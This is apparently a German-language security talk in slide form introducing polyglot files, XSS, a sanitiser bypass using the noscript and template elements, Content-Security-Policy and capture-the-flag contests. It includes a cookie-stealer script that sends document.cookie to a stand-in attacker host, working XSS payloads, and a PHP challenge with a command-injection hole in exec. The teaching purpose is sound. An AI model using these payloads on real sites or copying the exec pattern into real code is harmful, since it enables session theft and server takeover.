---
author: maxammann
title: ctw - capture the web
date: 11. Juni, 2019
theme: black
transition: none 
slideNumber: true
header-includes: <script src="http://localhost:35729/livereload.js?snipver=1"></script>
---

# Lets talk about files

---



```bash
wget "https://www.alchemistowl.org/pocorgtfo/pocorgtfo03.pdf"
firefox "pocorgtfo03.pdf"
```

![](./wats/pdf.png){height=400px}

<span style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: PoC||GTFO 0x03</span>

---

```bash
cp "pocorgtfo03.pdf" "pocorgtfo03.jpg"
firefox "pocorgtfo03.jpg"
```

. . .

![](./wats/jpg.png){height=400px}

---

```bash
unzip "pocorgtfo03.pdf" -d "unzipped/"
```

. . .

```bash
  Archive:  pocorgtfo03.pdf
  warning [pocorgtfo03.pdf]: 12224072 extra bytes at
  beginning or within zipfile (attempting to process anyway)
...
  inflating: unzipped/pocorgtfo02.pdf
  inflating: unzipped/pocorgtfo03-encrypt.py
...
```

---

<video src="./wats/watcat-title.mp4" height="400" data-autoplay loop nocontrols>

---

```bash
file --brief "unzipped/pocorgtfo03-encrypt.py"
Python script, ASCII text executable
python2 "unzipped/pocorgtfo03-encrypt.py"
firefox "enc-pocorgtfo03.pdf.png"
```

. . . 

![](./wats/png.png){height=350px}

---

<video src="./figures/doggy_wat.mp4" height="300" data-autoplay loop nocontrols>


---


```bash
aplay -r 22050 -f S16_LE "pocorgtfo03.pdf"
```

. . . 

<object type="image/svg+xml" data="./wats/spec.svg">
  Your browser does not support SVG
</object>


<div class="notes">
https://www.alchemistowl.org/pocorgtfo/pocorgtfo03.pdf Kapitel 11
</div>


<!-- # "weird machines"

<div class="notes">
http://langsec.org/papers/Bratus.pdf
</div>
-->
---

## Vulnerabilites

Eine **Lücke oder Schwäche** im Design oder der Implementation eines Systems, welche ausgenutzt werden kann um die Sicherheitsrichtlinie des Systems zu verletzen.
\
\
\
<div style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: IETF RFC 4949</div>

---

## Exploit

**Ein Exploit nutzt eine Vulnerability um eine bestimmte unerwartete Aktion auszuführen.**

* Vulnerability muss "exploitable" sein
* Exploits nutzen einen Payload um gewünschte Aktionen auszuführen

<!-- * Exploits sind abhänig von der Umgebung wie z.B.
  * CPU Architektur
  * OS (Linux x86, Window...)
  * Browser (Firefox, Chrome...)
-->
---

### Payload

<video src="./figures/bomb_ride.mp4" height="300" data-autoplay loop nocontrols>


---

### AJAX Cookie Stealer als Payload: 
```js
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "https://dr.evil/sink", true);
xmlhttp.send(JSON.stringify({
  hostname: window.location.host, 
  session: document.cookie
}));
```

---

# Beispiel einer XSS

* Vulterability: XSS
* Payload: z.B. unser Cookie Stealer oder hier `alert("XSS")`


\
\
\
<div style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: XSS on Google Search - Sanitizing HTML in The Client? von liveoverflow.com</div>

---

<center>`<div><script title="</div>">`</center>

. . .

![](./xss/simple-a.png){height=300px}

---

<center>`<script><div title="</script>">`</center>

. . .

![](./xss/simple-b.png){height=300px}

---

Aktuelle HTML-Parser sind zu komplex und zu unterschiedlich.

**▶ Serverseitige Sanitisation ist nicht ausreichend!**

---

## XSS Sanitisation mit `<template>`

```js
template = document.createElement("template")
template.innerHTML = '<img src=x onerror=alert("XSS")>'

// Sanitize DOM structure
template.content.children[0].removeAttribute("onerror")

div = document.createElement("div")
div.innerHTML = template.innerHTML
```


---

```js
template = document.createElement("template")
template.innerHTML = '<noscript><p title="</noscript>' +
    '<img src=x onerror=alert("XSS")>">'
```

![](./xss/template.png){height=200px}

---

```js
div = document.createElement("div")
div.innerHTML = template.innerHTML
```

. . .


<video onplay="alert('XSS')" src="./xss/hacked.mp4" height="200" data-autoplay loop nocontrols>

---

```js
div = document.createElement("div")
div.innerHTML = '<noscript><p title="</noscript>' +
    '<img src=x onerror=alert("XSS")>">'
```

![](./xss/div.png){height=200px}

---

<sup>
```
<noscript><p title="</noscript><img src=x onerror=alert("XSS")>">
```
</sup>

![DOM Tree für `<template>`](./xss/template.png){height=160px}
![DOM Tree für `<div>`](./xss/div.png){height=160px}

**Der DOM Tree ist je nach Kontext unterschiedlich, obwohl der ursprüngliche HTML-Code der gleiche ist!**


---

## Was passiert hier?

<style>
    .reveal blockquote { width: 100% }
</style>

<blockquote>
4.12.2 The noscript element \
The noscript element represents **nothing if scripting is enabled**, and represents its **children if scripting is disabled**.
</blockquote>

Da in einem `<template>` tag scripting deaktiviert ist, werden unterschiedliche DOM Trees gebaut.

---

* Vulnerability bestand in der Google Suche für 4 Monate! ([git commit](https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa))
* **Severity: <font color=red>Very High <i class="fas fa-bolt"></i></font>**

---

## `Content-Security-Policy` to the rescue

\
\
CSP is a strong defense-in-depth mechanism against XSS.
\
\
<span style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: https://www.w3.org/TR/CSP3/</span>

---

```js
Content-Security-Policy:  default-src 'self'; 
                          img-src *; 
                          script-src scripts.example.com
```
Verbietet inlinen von JavaScript und lässt nur bestimmte Quellen zu.

---

```js
Content-Security-Policy:  script-src 'nonce-r4nd0m'; 
                          img-src *;
```

Geblockt von CSP: 
<div class="strikethrough">
```html
<img src=x onerror=alert("XSS")>
<script>alert("XSS")</script>
```
</div>

. . .

Erlaubt: 
```html
<script nonce="nonce-r4nd0m">alert("XSS")</script>
<script nonce="nonce-r4nd0m" 
        src="https://cdn/lib.js"></script>
```
<font color=red>Hinweis: Erstetzt nicht das beheben von Fehlern!</font>

---

![](./figures/support.png)

---

![Google Vulnerability Reward Program payouts in 2018](./google_vuln_stats.png)

---

# Was sind CTFs?

* Capture the Flag sind Wettkämpfe
* Trainiert Frusttoleranz
* Anfänger: Ausnutzen eines Buffer-Overflow
* Profi: Finden iner Zero-Day in Safari 🤯

---

## Grab a beer and ctf!
```php
<?php
if (empty($_POST['hmac']) || empty($_POST['host'])) {
    header('HTTP/1.0 400 Bad Request'); exit;
}
$secret = getenv("SECRET"); 
if (isset($_POST['nonce']))
	$secret = hash_hmac('sha256', $_POST['nonce'], $secret);
$hmac = hash_hmac('sha256', $_POST['host'], $secret);
if ($hmac !== $_POST['hmac']) {
    header('HTTP/1.0 403 Forbidden'); exit;
}
echo exec("host ".$_POST['host']);
?>
```
<span style="position: absolute; bottom: 5px; right: 5px; font-size: 20px">Quelle: www.securify.nl/en/blog/SFY20180101/spot-the-bug-challenge-2018-warm-up.html</span>

<sub>
<i class="far fa-envelope"></i> [maxammann.org/contact](https://maxammann.org/contact)
<i class="fas fa-code"></i> [github.com/maxammann](https://github.com/maxammann)
</sub>
 
